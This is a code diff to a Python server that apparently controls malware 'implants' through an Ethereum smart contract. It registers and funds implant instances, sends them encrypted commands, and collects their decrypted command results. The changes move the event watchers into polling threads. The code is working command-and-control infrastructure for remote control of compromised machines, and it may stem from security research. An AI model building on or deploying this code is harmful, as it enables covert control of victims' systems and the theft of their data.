@@ -1,14 +1,15 @@
-import yaml, os, sys, glob, json,argparse
+import yaml, os, glob, json,argparse,datetime
 from os.path import join as opj
 from web3 import Web3, HTTPProvider
 from web3.contract import ConciseContract
 from Util.WalletOperations import unlockAccount, generatePassword, generateWallet, loadWallet, getAccountBalance
-from shutil import copyfile,copy
+from shutil import copy
 from Util.EtherLogEvents import *
 from Util.SolidityTypeConversions import *
 from Util.TransactionLogger import TransactionLogger
-
 import shelve
+from threading import Thread
+from eth_utils import to_checksum_address
 
 SERVER_CONF_FILE = opj('conf','server', 'ServerConf.yaml')
 TRANSACTION_LOG_LOC = opj('logs', 'transaction.log')
@@ -50,6 +51,7 @@ class ServerCommands:
 
 		self.transactionCostLogger = TransactionLogger(transactionLogFilename, self.web3)
 
+		self.shouldStop = False
 	
 	def loadContract(self):
 		'''
@@ -59,7 +61,9 @@ class ServerCommands:
 		l.info('loading contract from:', self.contractAddress)
 		l.debug('contract abi:', self.contractAbi)
 
-		contract = self.web3.eth.contract(self.contractAbi, self.contractAddress,  ContractFactoryClass=ConciseContract)
+		contract = self.web3.eth.contract(self.contractAddress,
+										  abi = self.contractAbi,
+										  ContractFactoryClass=ConciseContract)
 		return contract
 
 	'''
@@ -139,8 +143,6 @@ class ServerCommands:
 		self.fundTransfer(address,fundValue)
 		self.allowInstance(address)
 
-		#TODO:Split the balance to a small amount up first in sendTransaction and add most of the funds in allowInstance, that way it will only be transfered if instance successfully registered.
-
 		return address, clientConfTemplate
 
 	def decryptMessage(self, msg, decrypt=True):
@@ -178,10 +180,10 @@ class ServerCommands:
 		'''
 		if instanceAddress in self.instances:
 			commandEnc = self.encryptMessage(instanceAddress,command)
-			instanceHash = sha3AsBytes(instanceAddress)
+			instanceHash = Web3.sha3(hexstr = instanceAddress)
 			txhash = self.contract.addWork(instanceHash, commandEnc, self.instances['cmdId'], transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
 			
-			l.info("Command",self.instances['cmdId']," was sent to",instanceAddress, 'txHash:', txhash)
+			l.info("Command",self.instances['cmdId']," was sent to",instanceAddress, 'txHash:',bytes2Hex(txhash))
 			self.transactionCostLogger.insert(txhash, 'addWork',len(command))
 			
 			cmdId = self.instances['cmdId']
@@ -210,7 +212,7 @@ class ServerCommands:
 		:return:
 		'''
 		if instanceAddress in self.instances:
-			instanceHash = sha3AsBytes(instanceAddress)
+			instanceHash = Web3.sha3(hexstr = instanceAddress)
 			txhash = self.contract.removeInstance(instanceHash, transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
 			
 			l.info("disallowing ",instanceAddress, 'txHash:', txhash)
@@ -229,10 +231,10 @@ class ServerCommands:
 		:return:
 		'''
 		if instanceAddress in self.instances:
-			instanceHash = sha3AsBytes(instanceAddress)
+			instanceHash = Web3.sha3(hexstr = instanceAddress)
 			txhash = self.contract.allowInstance(instanceHash, transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
 			
-			l.info("registration allowed for:",instanceAddress,'hash:',encode_hex(instanceHash),'txHash:',txhash)
+			l.info("registration allowed for:",instanceAddress,'hash:',bytes2Hex(instanceHash),'txHash:',bytes2Hex(txhash))
 			self.transactionCostLogger.insert(txhash, 'allowInstance',len(instanceAddress))
 			
 			return True
@@ -246,7 +248,7 @@ class ServerCommands:
 		:return:
 		'''
 		if instanceAddress in self.instances:
-			instanceHash = sha3AsBytes(instanceAddress)
+			instanceHash = Web3.sha3(hexstr = instanceAddress)
 			sessionId = self.encryptMessage(instanceAddress, sessionId)
 			txhash = self.contract.registrationConfirmation(instanceHash,sessionId, transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
 			
@@ -277,7 +279,7 @@ class ServerCommands:
 	def unFundTransfer(self, instanceAddress):
 		'''
 		Removes all Ether from a compromised implant address. Use in case of implant compromise.
-		DOES NOT WORK!!! Needs to open the implant account first.
+		DOES NOT WORK AS IS !!! Needs to unlock the implant account first.
 		:param instanceAddress:
 		:return:
 		'''
@@ -293,105 +295,119 @@ class ServerCommands:
 			return False
 
 	def utilStrTimestamp(self):
-		return datetime.now().strftime("%H:%M:%S")
+		return datetime.datetime.now().strftime("%H:%M:%S")
 
-	def startInstanceRegistrationRequestWatcher(self):
-			try:
-				l.info('Starting to watch for new instance registrations...')
-				self.regRequestFilter, eventABI = createLogEventFilter(REGISTRATION_REQUEST_EVENT_NAME,
-																	self.contractAbi,
-																	self.contractAddress,
-																	self.web3,
-																	topicFilters=[])
 
-				def onRegistrationEventArrival(tx):
-					l.debug('new registration request, tx:', tx)
 
-					machineId = getLogEventArg(tx, eventABI, 'machineId')
-					machineId = self.decryptMessage(machineId)
+	def onCommandResultEventArrival(self, tx, eventABI):
+		try:
+			l.debug('new Command result:', tx)
 
-					transactionReceipt = self.web3.eth.getTransactionReceipt(tx['transactionHash'])
-					instanceAddress = transactionReceipt['from']
+			sessionAndMachineIdHash = bytes2Hex(getLogEventArg(tx, eventABI, 'sessionAndMachineIdHash'))
+			commandResult = getLogEventArg(tx, eventABI, 'commandResult')
+			commandResult = self.decryptMessage(commandResult)
+			cmdId = getLogEventArg(tx, eventABI, 'cmdId')
 
-					if instanceAddress in self.instances:
-						l.info('confirmed new registration Request from:', instanceAddress, 'on machine:', machineId)
-						#Contract has already validated that the instance is new and was not registered before
-						#all we have to do is to generate the instanceId for it.
-						sessionId = self.web3.sha3 (encode_hex(machineId) +
-													instanceAddress[2:] + #removes the 0x...
-													encode_hex(generatePassword())) #machineId+address+Random
+			transactionReceipt = self.web3.eth.getTransactionReceipt(tx['transactionHash'])
+			instanceAddress = transactionReceipt['from']
+			instanceAddress = to_checksum_address(instanceAddress)
+			if instanceAddress in self.instances:
+				l.info('got new Commandresult for cmdId:', cmdId, "from:", instanceAddress,
+					   'sessionAndMachineIdHash:', sessionAndMachineIdHash)
+				if sessionAndMachineIdHash == self.instances[instanceAddress]['sessionAndMachineIdHash']:
+					cmd = self.instances[instanceAddress]['commands'][cmdId]
 
-						sessionAndMachineIdHash = self.web3.sha3(sessionId + machineId)
+					cmdResParsed = json.loads(commandResult)
+					cmd['status'] = cmdResParsed['status']
+					cmd['output'] = cmdResParsed['output']
 
-						self.registrationConfirmation(instanceAddress,sessionId)
+					self.cmdArrival(instanceAddress, cmdId, cmd)
 
-						l.debug('saving sessionAndMachineIdHash for',instanceAddress,":", sessionAndMachineIdHash)
-						self.instances[instanceAddress]['sessionAndMachineIdHash'] = sessionAndMachineIdHash
-					else:
-						raise ValueError('Someone tried to register an instance'+instanceAddress+' that is not in local instance cache. This can be cause contract and server are out of sync')
-				
-				self.regRequestFilter.watch(onRegistrationEventArrival)
-				
-			except Exception as e:
-				l.error("Error in Instance Registraton event watcher operation:", e)
-				if self.regRequestFilter and self.regRequestFilter.running:
-					self.regRequestFilter.stopWatching()
+					self.instances.sync()
+					l.info('Confirmed match between instance issued command and result:',
+						   str(self.instances[instanceAddress]['commands'][cmdId])[0:200])
+				else:
+					l.error(
+						"Mismatch between saved session id and given by client! Client is invalid, recommend to remove!")
+					l.error("given id:", sessionAndMachineIdHash, 'saved:',
+							self.instances[instanceAddress]['sessionAndMachineIdHash'])
+			else:
+				raise ValueError('got result from instance', instanceAddress,
+								 ' that is not in local instance cache. This can be cause contract and server are out of sync')
+		except Exception as e:
+			import traceback
+			traceback.print_tb(e.__traceback__)
 
-	def startCommandResultWatcher(self):
-			try:
-				l.info('Starting to watch for command results from instances...')
-				self.cmdResultFilter, eventABI = createLogEventFilter(COMMAND_RESULT_EVENT_NAME,
-																	self.contractAbi,
-																	self.contractAddress,
-																	self.web3,
-																	topicFilters=[])
+			l.error("Error getting Command Results:", e)
 
-				def onCommandResultEventArrival(tx):
-					try:
-						l.debug('new Command result:', tx)
-	
-						sessionAndMachineIdHash = bytesToHexString(getLogEventArg(tx, eventABI, 'sessionAndMachineIdHash'))
-						commandResult = getLogEventArg(tx, eventABI, 'commandResult')
-						commandResult = self.decryptMessage(commandResult)
-						cmdId = getLogEventArg(tx, eventABI, 'cmdId')
-	
-						transactionReceipt = self.web3.eth.getTransactionReceipt(tx['transactionHash'])
-						instanceAddress = transactionReceipt['from']
-	
-						if instanceAddress in self.instances:
-							l.info('got new Commandresult for cmdId:',cmdId,"from:", instanceAddress, 'sessionAndMachineIdHash:', sessionAndMachineIdHash)
-							if sessionAndMachineIdHash == self.instances[instanceAddress]['sessionAndMachineIdHash']:
-								cmd = self.instances[instanceAddress]['commands'][cmdId]
-								
-								cmdResParsed = json.loads(commandResult)
-								cmd['status'] = cmdResParsed['status']
-								cmd['output'] = cmdResParsed['output']
-								
-								self.cmdArrival(instanceAddress, cmdId, cmd)
-								
-								self.instances.sync()
-								l.info ('Confirmed match between instance issued command and result:',str(self.instances[instanceAddress]['commands'][cmdId])[0:200])
-							else:
-								l.error("Mismatch between saved session id and given by client! Client is invalid, recommend to remove!")
-								l.error("given id:",sessionAndMachineIdHash,'saved:',self.instances[instanceAddress]['sessionAndMachineIdHash'])
-						else:
-							raise ValueError('got result from instance',instanceAddress,' that is not in local instance cache. This can be cause contract and server are out of sync')
-					except Exception as e:
-						l.error("Error getting Command Results:", e)
-				self.cmdResultFilter.watch(onCommandResultEventArrival)
-				
-			except Exception as e:
-				l.error("Error in Command Result event watcher operation:", e)
-				if self.cmdResultFilter and self.cmdResultFilter.running:
-					self.cmdResultFilter.stopWatching()
+	def onRegistrationEventArrival(self, tx, eventABI):
+		l.debug('new registration request, tx:', tx)
+
+		machineId = getLogEventArg(tx, eventABI, 'machineId')
+		machineId = self.decryptMessage(machineId)
+
+		transactionReceipt = self.web3.eth.getTransactionReceipt(tx['transactionHash'])
+
+		instanceAddress = transactionReceipt['from']
+		instanceAddress = to_checksum_address(instanceAddress)
+
+		if instanceAddress in self.instances:
+			l.info('confirmed new registration Request from:', instanceAddress, 'on machine:', machineId)
+			# Contract has already validated that the instance is new and was not registered before
+			# all we have to do is to generate the instanceId for it.
+			sessionId = Web3.sha3(hexstr = encode_hex(machineId) +
+									   instanceAddress[2:] +  # removes the 0x...
+									   encode_hex(generatePassword())  # machineId+address+Random
+								  ).hex()
+			l.debug ('generated a new sessionId:',sessionId)
+			sessionAndMachineIdHash = Web3.sha3(hexstr = sessionId + machineId).hex()
+
+			self.registrationConfirmation(instanceAddress, sessionId)
+
+			l.debug('saving sessionAndMachineIdHash for', instanceAddress, ":", sessionAndMachineIdHash)
+			self.instances[instanceAddress]['sessionAndMachineIdHash'] = sessionAndMachineIdHash
+		else:
+			raise ValueError(
+				'Someone tried to register an instance' + instanceAddress + ' that is not in local instance cache. This can be cause contract and server are out of sync')
+
 
 	def startAllWatchers(self):
-		self.startInstanceRegistrationRequestWatcher()
-		self.startCommandResultWatcher()
+		l.info('Starting to watch for command results from instances...')
+		def cmdResultFilterCreator (): return createLogEventFilter(COMMAND_RESULT_EVENT_NAME,
+															  self.contractAbi,
+															  self.contractAddress,
+															  self.web3,
+															  topicFilters=[])
+
+		l.info('Starting to watch for new instance registrations...')
+		def regRequestFilterCreator(): return createLogEventFilter(REGISTRATION_REQUEST_EVENT_NAME,
+															   self.contractAbi,
+															   self.contractAddress,
+															   self.web3,
+															   topicFilters=[])
+
+		def eventListenerLoop( filterCreator, poll_interval, handler):
+			event_filter, abi = filterCreator()
+			while not self.shouldStop:
+				try:
+					# l.info('checking loop...')
+					for event in event_filter.get_new_entries():
+						handler(event, abi)
+					time.sleep(poll_interval)
+				except Exception as e:
+					#TODO figure out the exact exception this happens on
+					l.info ('Filter was deleted... recreating it. error was:',e)
+					event_filter, abi = filterCreator()
+			l.info("worker thread has quit.")
+
+		worker = Thread(target=eventListenerLoop, args=(cmdResultFilterCreator, 1, self.onCommandResultEventArrival), daemon=True)
+		worker.start()
+		worker = Thread(target=eventListenerLoop, args=(regRequestFilterCreator, 1, self.onRegistrationEventArrival), daemon=True)
+		worker.start()
+
 
 	def stopAllWatchers(self):
-		self.cmdResultFilter.stopWatching()
-		self.regRequestFilter.stopWatching()
+		self.shouldStop = True
 
 
 	def printCommandResult (self, instance, cmdId):
